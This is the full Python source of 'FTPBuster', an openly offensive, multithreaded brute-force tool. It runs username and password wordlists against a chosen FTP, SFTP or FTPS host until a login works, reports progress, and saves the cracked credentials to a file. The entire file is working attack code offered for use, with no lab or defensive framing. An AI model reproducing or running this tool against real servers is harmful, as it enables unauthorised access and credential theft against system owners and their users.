#!/usr/bin/env python3


# FTPBuster - Ultimate FTP/SFTP/FTPS Brute Force Tool
# Developer: Sreeraj
# https://github.com/s-r-e-e-r-a-j


import ftplib
import paramiko
import argparse
import concurrent.futures
import itertools
import ssl
import sys
import time
import shutil
import threading
from concurrent.futures import FIRST_COMPLETED

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

class FTPBuster:
    def __init__(self, target, protocol, user_file=None, pass_file=None,
                 single_user=None, single_pass=None, port=None, threads=10, timeout=10, outfile=None):
        self.target = target
        self.protocol = protocol.upper()
        self.user_file = user_file
        self.pass_file = pass_file
        self.single_user = single_user
        self.single_pass = single_pass
        self.threads = min(threads, 50)
        self.timeout = timeout
        self.outfile = outfile
        self.stop_event = threading.Event()
        self.tried = 0
        self.start_time = time.time()
        self.total_combinations = 0

        if self.protocol not in ['FTP', 'SFTP', 'FTPS']:
            raise ValueError("Protocol must be one of: FTP, SFTP, FTPS")

        if not (self.user_file or self.single_user):
            raise ValueError("Provide a username or username file")
        if not (self.pass_file or self.single_pass):
            raise ValueError("Provide a password or password file")

        self.port = port if port else (21 if self.protocol in ['FTP', 'FTPS'] else 22)

    def read_wordlist(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            with open(filename, 'r', encoding='latin-1') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{RED}[!] Error reading {filename}: {e}{RESET}")
            sys.exit(1)

    def get_credentials(self):
        if self.single_user and self.single_pass:
            return [(self.single_user, self.single_pass)]

        users = [self.single_user] if self.single_user else self.read_wordlist(self.user_file)
        passwords = [self.single_pass] if self.single_pass else self.read_wordlist(self.pass_file)

        combos = list(itertools.product(users, passwords))
        self.total_combinations = len(combos)
        return combos

    def try_login(self, user, password):
        if self.stop_event.is_set():
            return (False, None, None)

        self.tried += 1

        try:
            if self.protocol == 'FTP':
                return (self.try_ftp(user, password), user, password)
            elif self.protocol == 'SFTP':
                return (self.try_sftp(user, password), user, password)
            elif self.protocol == 'FTPS':
                return (self.try_ftps(user, password), user, password)
        except:
            return (False, None, None)

    def try_ftp(self, user, password):
        try:
            ftp = ftplib.FTP(timeout=self.timeout)
            ftp.connect(self.target, self.port)
            ftp.login(user, password)
            ftp.quit()
            return True
        except:
            return False

    def try_sftp(self, user, password):
        try:
            transport = paramiko.Transport((self.target, self.port))
            transport.connect(username=user, password=password)
            transport.close()
            return True
        except:
            return False

    def try_ftps(self, user, password):
        try:
            context = ssl.create_default_context()
            ftps = ftplib.FTP_TLS(context=context, timeout=self.timeout)
            ftps.connect(self.target, self.port)
            ftps.login(user, password)
            ftps.prot_p()
            ftps.quit()
            return True
        except:
            return False

    def show_progress(self, final=False):
        elapsed = time.time() - self.start_time
        remaining = self.total_combinations - self.tried
        speed = self.tried / elapsed if elapsed > 0 else 0
        percent = (self.tried / self.total_combinations * 100) if self.total_combinations else 0
        eta = remaining / speed if speed > 0 else 0
        eta_str = time.strftime("%H:%M:%S", time.gmtime(eta)) if eta > 0 else "N/A"

        line = (f"{YELLOW}[+] Tried: {self.tried}/{self.total_combinations} "
                f"({percent:.1f}%) | Remain: {remaining} | "
                f"Speed: {speed:.1f}/s | Elapsed: {int(elapsed)}s | ETA: {eta_str}{RESET}")

        term_width = shutil.get_terminal_size((80, 20)).columns
        if len(line) > term_width:
            line = line[:term_width - 1]

        sys.stdout.write(f"\r\033[2K{line}")
        sys.stdout.flush()

        if final:
            print()

    def save_credentials(self, user, password):
        if self.outfile:
            try:
                with open(self.outfile, 'a') as f:
                    f.write(f"{user}:{password}\n")
            except Exception as e:
                print(f"{RED}[!] Error writing to file: {e}{RESET}")

    def run_attack(self):
        try:
            credentials = self.get_credentials()

            print(f"{CYAN}[*] Target: {self.protocol}://{self.target}:{self.port}{RESET}")
            print(f"{CYAN}[*] Total combinations: {len(credentials)}{RESET}")
            print(f"{CYAN}[*] Threads: {self.threads}{RESET}")
            print(f"{CYAN}[*] Timeout: {self.timeout}s{RESET}")
            if self.outfile:
                print(f"{CYAN}[*] Output file: {self.outfile}{RESET}")
            print(f"{CYAN}[*] Press CTRL+C to stop\n{RESET}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.try_login, user, pw): (user, pw) for user, pw in credentials[:self.threads * 2]}
                cred_iter = iter(credentials[self.threads * 2:])
                last_update = time.time()

                while futures and not self.stop_event.is_set():
                    done, _ = concurrent.futures.wait(futures, timeout=0.1, return_when=FIRST_COMPLETED)

                    for future in done:
                        result, user, password = future.result()
                        futures.pop(future)

                        if result:
                            self.stop_event.set()
                            self.show_progress(final=True)
                            print(f"\n{GREEN}[+] SUCCESS: {user}:{password}{RESET}")
                            self.save_credentials(user, password)
                            return

                        if not self.stop_event.is_set():
                            try:
                                new_user, new_pw = next(cred_iter)
                                futures[executor.submit(self.try_login, new_user, new_pw)] = (new_user, new_pw)
                            except StopIteration:
                                continue

                    if time.time() - last_update >= 0.2:
                        self.show_progress()
                        last_update = time.time()

                self.show_progress(final=True)
                if not self.stop_event.is_set():
                    print(f"\n{RED}[!] No valid credentials found.{RESET}")

        except KeyboardInterrupt:
            print(f"\n{RED}[!] Brute-force stopped by user.{RESET}")
        except Exception as e:
            print(f"\n{RED}[!] Error: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(
        description="FTPBuster - Ultimate FTP/SFTP/FTPS Brute Force Tool",
        formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
    parser.add_argument("-P", "--protocol", required=True, choices=['FTP', 'SFTP', 'FTPS'], help="Protocol")

    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-u", "--user-file", help="Username wordlist")
    user_group.add_argument("--user", help="Single username")

    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument("-p", "--pass-file", help="Password wordlist")
    pass_group.add_argument("--password", help="Single password")

    parser.add_argument("--port", type=int, help="Custom port")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10) (maximum: 50)")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (default: 10)")
    parser.add_argument("--outfile", help="Output file to save valid credentials")

    args = parser.parse_args()

    tool = FTPBuster(
        target=args.target,
        protocol=args.protocol,
        user_file=args.user_file,
        pass_file=args.pass_file,
        single_user=args.user,
        single_pass=args.password,
        port=args.port,
        threads=args.threads,
        timeout=args.timeout,
        outfile=args.outfile
    )

    tool.run_attack()

if __name__ == "__main__":
    main()
